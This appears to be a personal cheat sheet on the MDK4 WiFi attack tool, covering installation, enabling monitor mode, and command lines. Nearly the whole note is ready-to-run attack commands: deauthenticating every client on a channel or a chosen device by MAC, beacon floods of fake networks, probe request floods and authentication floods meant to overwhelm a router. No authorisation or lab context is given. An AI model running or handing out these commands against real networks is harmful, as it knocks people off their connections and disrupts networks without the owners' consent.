**MDK4** is a powerful WiFi attack tool (successor of MDK3). It's great for deauth, beacon flooding, and more.

**Wireless attack tool for IEEE 802.11 networks**  
This package contains a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.

**How to install:** `sudo apt install mdk4`

![[Pasted image 20260726045833.png|459]]

---


### Basic Usage

First, make sure monitor mode is on and "iwconfig" is configured:

```Bash
sudo airmon-ng start wlan1
```

```Bash
sudo iwconfig [interface] channel [channel]
```

---


### Main Attack Modes:

#### Deauthentication Attack (best one):

> Deauth all clients on channel **11**

```Bash
sudo mdk4 wlan1mon d -c 11
```

#### Target specific client

```Bash
sudo mdk4 wlan1mon d -c 11 -s [PHONE_MAC]
```

---


#### Beacon Flood (spam fake networks):

```Bash
sudo mdk4 wlan1mon b -c 1,6,11
```

---

#### Probe Request Flood (make devices reveal what networks they are looking for):

```Bash
sudo mdk4 wlan1mon p -c 11
```

---

#### Authentication Flood (overwhelm the router with fake connections):

```Bash
sudo mdk4 wlan1mon a -c 11
```

---



### Useful Options

```Bash
-c 1,6,11 # → channels to attack
-s [MAC] # → target specific station
-b [blacklist file] # → avoid certain networks

# To stop any attack: Press Ctrl + C.
```

---
